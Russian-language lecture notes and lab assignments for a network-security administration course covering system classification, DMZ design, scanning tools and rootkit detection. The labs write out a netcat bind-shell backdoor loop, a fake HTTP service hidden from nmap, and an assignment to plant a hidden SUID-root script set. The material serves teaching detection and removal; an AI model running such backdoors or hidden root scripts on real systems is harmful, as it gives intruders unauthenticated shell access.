# Модуль 1. Периметры безопасности и размещение сервисов в сети предприятия

## Обзор моделей безопасности и обязанностей администратора безопасности компьютерной сети

[Должностная инструкция aдминистраторa информационной безопасности](https://clck.ru/RLQU6)

[Должностная инструкция администратора безопасности компьютерных систем и сетей](https://clck.ru/RLQVR)

[Руководящий документАвтоматизированные системы. Защита от несанкционированного доступа к информации Классификация автоматизированных систем и требования по защите информации](https://clck.ru/DXeeB)

**Важный факт!**
*Вопросы информационной безопасности можно рассматривать только 
при наличии четко определенных конфликтующих сторон.*

Сокращения:
> АС - автоматизированные системы
> НСД - несанкционированный доступ
> СЗИ - система защиты информации
> СЗИ НСД - система защиты информации от несанкционированного доступа

1. Классификация распространяется на все действующие и проектируемые АС учреждений, организаций и предприятий, обрабатывающие конфиденциальную информацию.
2. Деление АС на соответствующие классы по условиям их функционирования с точки зрения защиты информации необходимо в целях разработки и применения обоснованных мер по достижению требуемого уровня защиты информации.
3. Дифференциация подхода к выбору методов и средств защиты определяется важностью обрабатываемой информации, различием АС по своему составу, структуре, способам обработки информации, количественному и качественному составу пользователей и обслуживающего персонала.
4. Необходимыми исходными данными для проведения классификации конкретной АС являются:

	* перечень защищаемых информационных ресурсов АС и их уровень конфиденциальности;
	* перечень лиц, имеющих доступ к штатным средствам АС, с указанием их уровня полномочий;
	* матрица доступа или полномочий субъектов доступа по отношению к защищаемым информационным ресурсам АС;
	* режим обработки данных в АС.

1. К числу определяющих признаков, по которым производится группировка АC в различные классы, относятся:

	* наличие в АС информации различного уровня конфиденциальности;
	* уровень полномочий субъектов доступа АС на доступ к конфиденциальной информации;
	* режим обработки данных в АС - коллективный или индивидуальный.

1. Устанавливается три группы и девять классов защищенности АС от НСД к информации.

	- Третья группа включает АС, в которых работает один пользователь. Группа содержит два класса - 3Б и 3А.
	- Вторая группа включает АС, в которых работает много пользователей с одинаковыми правами. Группа содержит два класса - 2Б и 2А.
	- Первая группа включает многопользовательские АС. Группа содержит пять классов - 1Д, 1Г, 1В, 1Б и 1А.

*Примеры*

### Калькулятор Windows.

![Калькулятор](Калькулятор.png)

С т.з. данной программы все пользователи - один. Т.е. категория - 3.

### Windows 9x

![Винда](Винда.png)

В системе присутствует "Окно входа в систему"...

![Виндалогин](Виндалогин.png)

... т.е. пользователи различаются. Но из-за ограничений файловой системы FAT(VFAT) 
их права не разграничены. Т.е. категория 2.

### Ubuntu Linux

![Ubunluls](Ubunluls.png)

Как мы знаем, в большинстве современных ОС имеется разделение прав доступа к объектам. Т.е. Ubuntu (например) - категория 1.

### Вопросы:
1) Правомочно ли рассматривать Калькулятор Windows как АС?

2) Приведите примеры АС II категории?

3) Определите категорию АС: сайт статической верстки, обновление выполняется по FTP.

### Основные требования к АС

Идентификация, проверка подлинности и контроль доступа субъектов

Регистрация и учет: входа (выхода) субъектов доступа в (из) систему(ы) (узел сети)

Регистрация и учет: выдачи печатных (графических) выходных документов

Регистрация и учет: запуска (завершения) программ и процессов (заданий, задач)

Регистрация и учет: доступа  программ  субъектов  доступа  к  файлам, 

Регистрация и учет: доступа к терминалам, ЭВМ, узлам сети ЭВМ, каналам связи, внешним устройствам ЭВМ, программам, томам, каталогам, файлам, записям, полям записей.

Регистрация и учет: изменения полномочий субъектов доступа.


 - дата и время входа (выхода) субъекта доступа в систему (из системы) или загрузки (останова) системы.
 - результат   попытки   входа:   успешная   или   неуспешная 
 - несанкционированная;
 - идентификатор (код или фамилия) субъекта, предъявленный при попытке доступа;
 - должен  проводиться  учет  всех  защищаемых  носителей  информации  с помощью их маркировки и с занесением учетных данных журнала (учетную карточку);
 - учет защищаемых носителей должен проводиться в журнале с регистрацией их выдачи.

Обеспечение целостности программных средств и обрабатываемой информации

 - целостность СЗИ НСД проверяется при загрузке системы по контрольным суммам компонент СЗИ;
 - целостность  программной  среды  обеспечивается  использованием трансляторов с языков высокого уровня и отсутствием средств модификации объектного  кода  программ  в  процессе  обработки  и  хранения защищаемой информации;
 - должно проводиться периодическое тестирование функций СЗИ НСД при изменении программной среды и персонала АС с помощью тест-программ, имитирующих попытки НСД;
 - должны  быть  в  наличии  средства  восстановления  СЗИ  НСД, предусматривающие ведение двух копий программных средств СЗИ НСД и их периодическое обновление и контроль работоспособности.

Наличие администратора (службы) защиты информации в АС

Периодическое тестирование СЗИ НСД

Наличие средств восстановления СЗИ НСД

### Задачи и функции Администратора информационной безопасности

- Kонтроль эффективности защиты информации;
- Cопровождение СЗИ от  НСД и основных технических средств и систем;
- Kонтроль разграничения доступа.
- Kонтроль соответствия действий пользователей АС требованиям.
- Участие на стадии проектирования (внедрения) АС в разработке технологии обработки информации ограниченного доступа (далее – информации) по вопросам:
	- организации порядка учета, хранения и обращения с документами и носителями информации;
  - определения степени секретности отдельных документов, носителей и массивов информации;
  - подготовки инструкций, определяющих задачи, функции, ответственность, права и обязанности  администраторов и пользователей АС по вопросам защиты информации, а также ответственных по защите информации в процессе автоматизированной обработки информации.
- Сопровождение СЗИ от НСД к ней, в том числе средств криптографической защиты информации.
- Контроль соответствия общесистемной программной среды стандарту (контроль целостности программного обеспечения) и проверка включаемых в АС новых программных средств.
- Методическое руководство работой администраторов и пользователей АС в вопросах обеспечения информационной безопасности.
- Ведение переченя установленных в подразделениях ОТСС, СЗИ от НСД и перечень задач, решаемых с их использованием.
- Непосредственное управление режимами работы и административную поддержку функционирования \ применяемых на рабочих станциях специальных программных и программно-аппаратных СЗИ от НСД.
- Периодически проверять состояние используемых СЗИ от НСД, осуществлять проверку правильности их настройки (выборочное тестирование).
- Вести журнал учета нештатных ситуаций, фактов вскрытия и опечатывания, защищенных СВТ, выполнения профилактических работ, установки и модификации аппаратных и программных СЗИ.
- Проводить работу по выявлению возможности вмешательства в процесс функционирования АС и осуществления НСД к информации и техническим средствам РС.
- Докладывать руководству о выявленных угрозах безопасности информации, обрабатываемой в АС, об имевших место попытках НСД к информации и техническим средствам РС.


## Разделение сервисов сети предприятия 

### Вариант 1. Плоская сеть

![плоская сеть](плоскаясеть.jpg)


В данном варианте все узлы корпоративной сети содержатся в одной, общей для всех сети («Внутренняя сеть»), в рамках которой коммуникации между ними не ограничиваются. Сеть подключена к Интернет через пограничный маршрутизатор/межсетевой экран.

Плюсы варианта:

 - Минимальные требования к функционалу IFW (можно сделать практически на любом, даже домашнем роутере).
	
 - Минимальные требования к знаниям специалиста, осуществляющего реализацию варианта.

Минусы варианта:

  - Минимальный уровень безопасности. В случае взлома, при котором Нарушитель получит контроль над одним из опубликованных в Интернете серверов, ему для дальнейшей атаки становятся доступны все остальные узлы и каналы связи корпоративной сети.

### Вариант 2. DMZ

![dmz](дмз.jpg)

Для устранения этого недостатка узлы сети, доступные из Интернет, помещают в специально выделенный сегмент – демилитаризованную зону (DMZ). DMZ организуется с помощью межсетевых экранов, отделяющих ее от Интернет 
(IFW) и от внутренней сети (DFW).

При этом правила фильтрации межсетевых экранов выглядят следующим образом:

- Из внутренней сети можно инициировать соединения в DMZ и в WAN (Wide Area Network).
- Из DMZ можно инициировать соединения в WAN.
- Из WAN можно инициировать соединения в DMZ.
- Инициация соединений из WAN и DMZ ко внутренней сети запрещена.

Плюсы варианта:

 - Повышенная защищённость сети от взломов отдельных сервисов. Даже если один из серверов будет взломан, Нарушитель не сможет получить доступ к ресурсам, находящимся во внутренней сети (например, сетевым принтерам, системам видеонаблюдения и т.д.).


Минусы варианта:

- Сам по себе вынос серверов в DMZ не повышает их защищенность.
- Необходим дополнительный МЭ для отделения DMZ от внутренней сети.

### Вариант 3. Разделение сервисов на Front-End и Back-End

![Front-End и Back-End](фэбэ.jpg)

Одним из вариантов исправления ситуации является разделение функционала сервиса на две части: Front-End и Back-End. При этом каждая часть располагается на отдельном сервере, между которыми организуется сетевое взаимодействие. Сервера Front-End, реализующие функционал взаимодействия с клиентами, находящимися в Интернет, размещают в DMZ, а сервера Back-End, реализующие остальной функционал, оставляют во внутренней сети. Для взаимодействия между ними на DFW создают правила, разрешающие инициацию подключений от Front-End к Back-End.

Плюсы варианта:

  - В общем случае атаки, направленные против защищаемого сервиса, могут «споткнуться» об Front-End, что позволит нейтрализовать или существенно снизить возможный ущерб. Например, атаки типа TCP SYN Flood или slow http read, направленные на сервис, приведут к тому, что Front-End сервер может оказаться недоступен, в то время как Back-End будет продолжать нормально функционировать и обслуживать пользователей.
  - В общем случае на Back-End сервере может не быть доступа в Интернет, что в случае его взлома (например, локально запущенным вредоносным кодом ) затруднит удаленное управление им из Интернет.
  - Front-End хорошо подходит для размещения на нем межсетевого экрана уровня приложений (например, Web application firewall) или системы предотвращения вторжений (IPS, например snort).


Минусы варианта:

  - Для связи между Front-End и Back-End на DFW создается правило, разрешающее инициацию соединения из DMZ во внутреннюю сеть, что порождает угрозы, связанные с использованием данного правила со стороны других узлов в DMZ (например, за счет реализации атак IP spoofing, ARP poisoning и т. д.)
  - Не все сервисы могут быть разделены на Front-End и Back-End.
  - В компании должны быть реализованы бизнес-процессы актуализации правил межсетевого экранирования.
  - В компании должны быть реализованы механизмы защиты от атак со стороны Нарушителей, получивших доступ к серверу в DMZ.


# Лабораторные работы: Развертывание шлюза и сетей предприятия

## Работа с nmap

	student@PC / $ nmap localhost

	Starting Nmap 7.40 ( https://nmap.org ) at 2020-10-12 18:03 +05
	Nmap scan report for localhost (127.0.0.1)
	Host is up (0.000084s latency).
	Other addresses for localhost (not scanned): ::1
	Not shown: 995 closed ports
	PORT     STATE SERVICE
	22/tcp   open  ssh
	25/tcp   open  smtp
	80/tcp   open  http
	631/tcp  open  ipp
	8081/tcp open  blackice-icecap

	Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
	student@PC / $ nmap -A localhost

	Starting Nmap 7.40 ( https://nmap.org ) at 2020-10-12 18:03 +05
	Nmap scan report for localhost (127.0.0.1)
	Host is up (0.000081s latency).
	Other addresses for localhost (not scanned): ::1
	Not shown: 995 closed ports
	PORT     STATE SERVICE  VERSION
	22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
	| ssh-hostkey: 
	|   2048 34:ca:ed:e8:f9:61:1d:4a:6f:35:20:04:1e:2c:6c:a1 (RSA)
	|_  256 12:15:e1:57:9a:92:98:0c:9f:bd:9b:0a:b1:29:bc:8e (ECDSA)
	25/tcp   open  smtp     Exim smtpd 4.89
	| smtp-commands: PC Hello localhost [127.0.0.1], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, 
	|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
	80/tcp   open  http     Apache httpd 2.4.25 ((Debian))
	|_http-server-header: Apache/2.4.25 (Debian)
	|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
	631/tcp  open  ipp      CUPS 2.2
	| http-methods: 
	|_  Potentially risky methods: PUT
	| http-robots.txt: 1 disallowed entry 
	|_/
	|_http-server-header: CUPS/2.2 IPP/2.1
	|_http-title: Home - CUPS 2.2.1
	8081/tcp open  backdoor No-auth shell (**BACKDOOR**)
	Service Info: Host: PC; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds

## Cозздание бэкдора
	student@PC / $ cd /tmp
	student@PC /tmp/ $ mkfifo fifo_file
	student@PC /tmp/ $ cat fifo_file | nc -l -p 8080 | bash > fifo_file

	while true
	do
		cat fifo_file | nc -l -p 8080 | bash > fifo_file	
	done
	
## Устранение бэкдора
	student@PC / $ netstat -apn | grep 8080
	(Not all processes could be identified, non-owned process info
	 will not be shown, you would have to be root to see it all.)
	tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      29656/nc            
	student@PC / $ ps fax | grep 29656
	29779 pts/2    S+     0:00  |   |   \_ grep --color=auto 29656
	29656 pts/4    S+     0:00  |       \_ nc -l -p 8080
	student@PC / $ ps fax | grep -B 3 29656
	 4943 pts/1    Ss+    0:00  |   \_ bash
	12740 pts/2    Ss     0:00  |   \_ bash
	29788 pts/2    R+     0:00  |   |   \_ ps fax
	29789 pts/2    S+     0:00  |   |   \_ grep --color=auto -B 3 29656
	16188 pts/3    Ss+    0:00  |   \_ bash
	29186 pts/4    Ss     0:00  |   \_ bash < родитель
	29655 pts/4    S+     0:00  |       \_ cat aa
	29656 pts/4    S+     0:00  |       \_ nc -l -p 8080
	^^^^^ PID бэкдора
	student@PC / $ kill 29656 бэкдор перезапустился
	student@PC / $ kill 29186 
	student@PC / $ kill -9 29186 бэкдор уничтожен
	student@PC / $ netstat -apn | grep 8080
								пусто!
	student@PC / $ nmap localhost
	Not shown: 996 closed ports
	PORT    STATE SERVICE
	22/tcp  open  ssh
	25/tcp  open  smtp
	80/tcp  open  http
	631/tcp open  ipp
															Порта 8080 нет в списке!

## Настройка шлюза для подключения сети предприятия к Internet

[Обеспечение работоспособности и защиты межсетевого экрана с помощью iptables](https://clck.ru/RLqPk)

[Проброс портов в локальную сеть с помощью iptables](https://clck.ru/RMGKn)

1) Изучить литературу по ссылке.

2) Используя виртуальную машину (или хост) сконфигурировать:

 - Файервол плоской сети
 - Проброс порта 80 на один из внутренних хостов

3) Продемонстрировать результат, используя nmap для тестирования.

[Работа с git](https://www.youtube.com/watch?v=wJARN099DUw)

# Модуль 2 Анализ информационных систем предприятия с точки зрения безопасности

## Обзор сканеров сетей и анализаторов траффика

[21 лучший инструмент Kali Linux для взлома и тестирования на проникновение](https://clck.ru/RMuaG)

### Инструмент Nmap 

Nmap — свободная утилита, предназначенная для разнообразного настраиваемого сканирования IP-сетей с любым количеством объектов, определения состояния объектов сканируемой сети (портов и соответствующих им служб). Изначально программа была реализована для систем UNIX, но сейчас доступны версии для множества операционных систем.

Nmap использует множество различных методов сканирования, таких как UDP, TCP (connect), TCP SYN (полуоткрытое), FTP-proxy (прорыв через ftp), Reverse-ident, ICMP (ping), FIN, ACK, Xmas tree, SYN- и NULL-сканирование. Nmap также поддерживает большой набор дополнительных возможностей, а именно: определение операционной системы удалённого хоста с использованием отпечатков стека TCP/IP, «невидимое» сканирование, динамическое вычисление времени задержки и повтор передачи пакетов, параллельное сканирование, определение неактивных хостов методом параллельного ping-опроса, сканирование с использованием ложных хостов, определение наличия пакетных фильтров, прямое (без использования portmapper) RPC-сканирование, сканирование с использованием IP-фрагментации, поиск уязвимостей SQL Injection, а также произвольное указание IP-адресов и номеров портов сканируемых сетей.

![Nmap-4.53.png](https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Nmap-4.53.png/800px-Nmap-4.53.png)

### Инструмент Wireshark 

Wireshark — программа-анализатор трафика для компьютерных сетей Ethernet и некоторых других. Имеет графический пользовательский интерфейс. Изначально проект назывался Ethereal, но, из-за проблем с торговой маркой, в июне 2006 года проект был переименован в Wireshark.

Функциональность, которую предоставляет Wireshark, очень схожа с возможностями программы tcpdump, однако Wireshark имеет графический пользовательский интерфейс и гораздо больше возможностей по сортировке и фильтрации информации. Программа позволяет пользователю просматривать весь проходящий по сети трафик в режиме реального времени, переводя сетевую карту в неразборчивый режим (англ. promiscuous mode).

Программа распространяется под свободной лицензией GNU GPL и использует для формирования графического интерфейса кроссплатформенную библиотеку GTK+ (планируется переход на Qt). Существуют версии для большинства UNIX-подобных систем, в том числе GNU/Linux, Solaris, FreeBSD, NetBSD, OpenBSD, Mac OS X, а также для Windows.

![Wireshark](https://upload.wikimedia.org/wikipedia/commons/thumb/9/90/Wireshark_3.0.3_screenshot.png/800px-Wireshark_3.0.3_screenshot.png)


### Инструмент Nessus 

Nessus — программа для автоматического поиска известных изъянов в защите информационных систем. Она способна обнаружить наиболее часто встречающиеся виды уязвимостей, например:
Программа имеет клиент-серверную архитектуру, что сильно расширяет возможности сканирования.
Согласно проведенному порталом securitylab.ru опросу, nessus используют 17 % респондентов 
Прежде всего используется для сканирования портов и определяет сервисы, использующие их. Также проводится проверка сервисов по базе уязвимостей. Для тестирования уязвимостей используются специальные плагины, написанные на языке NASL(Nessus Attack Scripting Language).

![Nessus-Professional-FullColor-RGB.svg](https://upload.wikimedia.org/wikipedia/commons/a/ad/Nessus_ng_report.png)



### Инструмент John the Ripper 

John The Ripper (досл. Джон-потрошитель) — свободная программа, предназначенная для восстановления паролей по их хешам. Основное назначение программы — аудит слабых паролей в UNIX системах путём перебора возможных вариантов. ПО JtR способно создавать словари любой сложности, а также извлекать хеш из файла, что является одной из самых сильных сторон JtR по сравнению с аналогичными программами. Программа также может выполнять аудит NTLM хешей, Kerberos, и др. Существуют реализации под различные ОС. Весьма популярна из-за поддержки большого количества хешей, автораспознавания хеша и настраиваемого взломщика. Также поддерживает множество модулей, включая сторонние, предоставляющих поддержку MD4 хешей, LDAP и MySQL паролей и т.д. Кроме хешей паролей доступен перебор паролей к архивам, атаки на методы аутентификации (WPA, HMAC,...). Существует кросс-платформенный графический интерфейс Johny - GUI, который требуется устанавливать отдельно. На 2012 год поддерживалось более 30 форматов в jumbo версии. По состоянию на июль 2018 года JtR bleeding-jumbo версия поддерживает 262 формата.
На компьютерном сленге среди разработчиков JtR упоминается, как кровотечение.[источник не указан 424 дня]
Ниже представлен пример вывода программы во время работы в операционной системе Linux.

![Image-wertfghjnmbvc.jpg](https://upload.wikimedia.org/wikipedia/commons/thumb/e/ef/Image-wertfghjnmbvc.jpg/800px-Image-wertfghjnmbvc.jpg)
### Инструмент Snort 

Snort — свободная сетевая система предотвращения вторжений (IPS) и обнаружения вторжений (IDS) с открытым исходным кодом, способная выполнять регистрацию пакетов и в реальном времени осуществлять анализ трафика в IP-сетях.
Создана Мартином Рёшем (англ. Martin Roesch), в дальнейшем развивалась и поддерживалась основанной им компанией Sourcefire (поглощена Cisco в 2013 году).
Выполняет протоколирование, анализ, поиск по содержимому, а также широко используется для активного блокирования или пассивного обнаружения целого ряда нападений и зондирований, таких как попытки атак на переполнение буфера, скрытое сканирование портов, атаки на веб-приложения, SMB-зондирование и попытки определения операционной системы. Программное обеспечение в основном используется для предотвращения проникновения, блокирования атак, если они имеют место.

![Snort ids console.gif](https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Snort_ids_console.gif/800px-Snort_ids_console.gif)
### Инструмент Nikto 

Nikto — веб-сканер, проверяющий веб-серверы на самые частые ошибки, возникающие обычно из-за человеческого фактора. Проверяет целевой веб-сервер на наличие опасных файлов и исполняемых сценариев, инструментов администрирования базами данных, устаревшего программного обеспечения.
Nikto — это  open-source веб-сканер, однако некоторые файлы, которые он использует для работы, таковыми не являются.
Nikto выиграл "Best IT Security Tools for 2009" от Security-Database в номинации программ с открытым исходным кодом для сканирования приложений.

## Лабораторные работы

### Определение списка хостов с использованием nmap

	$ nmap 192.168.43.*

Результат:

	Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 12:23 +05
	Nmap scan report for gateway (192.168.43.1)
	Host is up (0.025s latency).
	Not shown: 999 closed ports
	PORT   STATE SERVICE
	53/tcp open  domain

	Nmap scan report for microlab (192.168.43.25)
	Host is up (0.000044s latency).
	Not shown: 999 closed ports
	PORT   STATE SERVICE
	22/tcp open  ssh

	Nmap scan report for macrolab (192.168.43.77)
	Host is up (0.025s latency).
	Not shown: 999 closed ports
	PORT   STATE SERVICE
	23/tcp open  telnet

	Nmap scan report for extralab (192.168.43.180)
	Host is up (0.012s latency).
	Not shown: 997 closed ports
	PORT    STATE SERVICE
	22/tcp  open  ssh
	80/tcp  open  http
	631/tcp open  ipp

	Nmap done: 256 IP addresses (4 hosts up) scanned in 6.08 seconds

### Определение типа сервиса на указанном хосте/порту

Используется типовой порт:

	$ nmap -A -p 631 192.168.43.180

Результат:

	Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 12:28 +05
	Nmap scan report for extralab (192.168.43.180)
	Host is up (0.0026s latency).
	PORT    STATE SERVICE VERSION
	631/tcp open  ipp     CUPS 2.2
	| http-methods: 
	|_  Potentially risky methods: PUT
	| http-robots.txt: 1 disallowed entry 
	|_/
	|_http-server-header: CUPS/2.2 IPP/2.1
	|_http-title: Home - CUPS 2.2.1

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds

Обнаружен CUPS версии 2.2.1.

![cups](cups.png)

Используется "левый" порт и фальшивый сервер:

![fakehttp](fakehttp.png)

	echo "HTTP/1.1 200 OK"
	echo "Date: Wed, 11 Feb 2009 11:20:59 GMT"
	echo "Server: Apache"
	echo "X-Powered-By: PHP/5.2.4-2ubuntu5wm1"
	echo "Last-Modified: Wed, 11 Feb 2009 11:20:59 GMT"
	echo "Content-Language: ru"
	echo "Content-Type: text/html; charset=utf-8"
	echo "Connection: close"
	echo ""
	echo "<pre>"
	date
	echo "</pre>"

Peзультат:

	$ nmap -A -p 8080 localhost
	Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 12:46 +05
	Nmap scan report for localhost (127.0.0.1)
	Host is up (0.000065s latency).

	PORT     STATE SERVICE    VERSION
	8080/tcp open  http-proxy Apache
	| fingerprint-strings: 
	|   NULL: 
	|     HTTP/1.1 200 OK
	|     Date: Wed, 11 Feb 2009 11:20:59 GMT
	|     Server: Apache
	|     X-Powered-By: PHP/5.2.4-2ubuntu5wm1
	|     Last-Modified: Wed, 11 Feb 2009 11:20:59 GMT
	|     Content-Language: ru
	|     Content-Type: text/html; charset=utf-8
	|     Connection: close
	|     <pre>
	|     2020 12:46:01 +05
	|_    </pre>
	| http-open-proxy: Potentially OPEN proxy.
	|_Methods supported:CONNECTION
	|_http-server-header: Apache
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port8080-TCP:V=7.80%I=7%D=10/13%Time=5F855B39%P=x86_64-pc-linux-gnu%r(N
	SF:ULL,111,"HTTP/1\.1\x20200\x20OK\nDate:\x20Wed,\x2011\x20Feb\x202009\x20
	SF:11:20:59\x20GMT\nServer:\x20Apache\nX-Powered-By:\x20PHP/5\.2\.4-2ubunt
	SF:u5wm1\nLast-Modified:\x20Wed,\x2011\x20Feb\x202009\x2011:20:59\x20GMT\n
	SF:Content-Language:\x20ru\nContent-Type:\x20text/html;\x20charset=utf-8\n
	SF:Connection:\x20close\n\n<pre>\n\xd0\x92\xd1\x82\x2013\x20\xd0\xbe\xd0\x
	SF:ba\xd1\x82\x202020\x2012:46:01\x20\+05\n</pre>\n");

Peзультат на порту 18765:

	$ nmap -A localhost
	...
	PORT    STATE SERVICE VERSION
	22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
	631/tcp open  ipp     CUPS 2.3
	...

Фальшивый сервер *не обнаружен!*

	$ while true; do cat a | nc -l -p 18765 | ./http.sh > a; done
	GET / HTTP/1.0

	$ while true; do cat a | nc -l -p 8080 | ./http.sh > a; done
	GET / HTTP/1.0

	OPTIONS / HTTP/1.0

	GET / HTTP/1.1
	Host: localhost:8080
	Connection: close
	User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

	PROPFIND / HTTP/1.1
	Depth: 1
	Content-Length: 0
	Host: localhost:8080
	Connection: close
	User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

	GET / HTTP/1.1
	Host: localhost:8080
	Connection: close
	User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

	GET / HTTP/1.1
	Host: localhost:8080
	Connection: close
	User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

Сервер возвращает случайные коды:

	$ while true; do cat a | nc -l -p 8080 | ./http.sh > a; done
	GET / HTTP/1.0

	ieU��random1random2random3random4
	                                 /
	GET / HTTP/1.1
	Connection: close
	Host: localhost:8080
	User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

	GET /favicon.ico HTTP/1.1
	Connection: close
	Host: localhost:8080
	User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

	�f��Q�%�/N�+����l[��f#B�i�

	                          H� �Vd�
	                                 �b%�]eWP]�25>�F�w�%شJueJ�395/�,�0��̨̩̪���������]�a�W�S�+�/������������`�V�R�$�(kj�s�w�
	�8���	�2��ED������Q������P=�<���A�
	                                    	localhost



	*(
	GET / HTTP/1.1
	Connection: close
	Host: localhost:8080
	User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

Результат:

	$ nmap -A localhost -p 8080
	PORT     STATE SERVICE     VERSION
	8080/tcp open  http-proxy?

Сервер не распознан. Что не мешает злоумышленнику работать с ним. 

Вывод. От nmap можно спрятать сервер, если разместить его вне диапазона портов, 
сканируемых по-умолчанию и нарушить алгоритм его работы. 
На действия злоумышленника это никак не повлияет.

### Расшифровка http-траффика с Wireshark

![Wireshark](wireshark.png)

Провели сканирование фэйкового http-сервера и получили следующий траффик:

![Wireshark](decode_0.png)

### Задача:
Провести сканирование собственного хоста с проброшенным портом и:

- определить факт сканирования по данным wireshark
- определить используемое ПО

## Подробнее про сканирование

Cocтояния порта:
- open (открытый порт)  — порт открыт, и служба принимает TCP- или UDP-соединения по этому порту (данный порт наиболее уязвим для взлома);
- filtered — порт закрыт брандмауэром, иной блокирующей программой или службой (правила роутера, аппаратный брандмауэр и т.п.);
- closed — порт закрыт, так как нет службы или иной программы, прослушивающей этот порт на компьютере.
- unfiltered — Nmap не смог точно определить, открыт порт или закрыт, обычно такое значение присваивается при сканировании методом ACK 

*Вывод:*

Закрыть порт нельзя никак кроме завершения процесса, его открывшего. Отфильтровать - можно.
Нет смысла "закрывать" на fw порты, которые не прослушиваются ни одной программой.

Подробнее:

[Сетевой сканер Nmap как средство аудита локальной сети](https://clck.ru/RN7sk)

## Руткиты и их обнаружение

[Установка, настройка и использование сканера уязвимостей chkrootkit](https://clck.ru/RN8GE)

Руткит (англ. rootkit, то есть «набор root-а») — набор программных средств (например, исполняемых файлов, скриптов, конфигурационных файлов), обеспечивающих:

 - маскировку объектов (процессов, файлов, каталогов, драйверов);
 - управление (событиями, происходящими в системе);
 - сбор данных (параметров системы).

Термин Rootkit исторически пришёл из мира UNIX, и под этим термином понимается набор утилит или специальный модуль ядра, которые злоумышленник устанавливает на взломанной им компьютерной системе сразу после получения прав суперпользователя. Этот набор, как правило, включает в себя разнообразные утилиты для «заметания следов» вторжения в систему, делает незаметными снифферы, сканеры, кейлоггеры, троянские программы, замещающие основные утилиты UNIX (в случае не ядерного руткита). Rootkit позволяет взломщику закрепиться во взломанной системе и скрыть следы своей деятельности путём скрытия файлов, процессов, а также самого присутствия руткита в системе.

В систему руткит может быть установлен различными способами: загрузка посредством эксплойта, после получения шелл-доступа (в таком случае, может использоваться средство типа wget или исходный FTP-клиент для загрузки руткита с удаленного устройства), в исходном коде или ресурсах программного продукта. 


- В Microsoft Windows
	- Захват таблиц вызовов
	- Перехват модификацией кода функции
	- DKOM (Direct Kernel Object Manipulation, прямая манипуляция объектами ядра)
	- Драйверы
- В UNIX и Linux
    - Подмена основных системных утилит 
    - В виде модуля ядра и основанные на патчинге VFS или перехвате таблицы системных вызовов
    - Модификация физической памяти ядра.

Поиск:

- Сигнатурный поиск. Применяется еще со времен первых антивирусов и представляет собой поиск в проверяемом файле уникальной цепочки байтов (сигнатуры), присущей вредоносной программе.
- Эвристический или поведенческий анализатор. Эта технология основывается на поиске отклонений в настройках системы, конфигурационных файлах Linux или реестре Windows, подозрительном поведении процессов и модулей и так далее.
- Контроль целостности. Этот тип поиcка основан на сравнении контрольной суммы (MD5 и тому подобное) или цифровой пoдписи разнообразных системных файлов с базой, содержащей контрольную сумму оpигинальных файлов. В случае несовпадения программа делает вывод, что файл был модифицирован или вовсе заменен.

## Лабораторные работы

1. Cоздать простейший руткит - разместить в "секретном" месте набор шелл-команд с SUID на root.
2. С его помощью создать фэйк-сервер http (код выше).
3. Попытаться обнаружить его различными типовыми сканерами.
4. Сформировать отчет на git.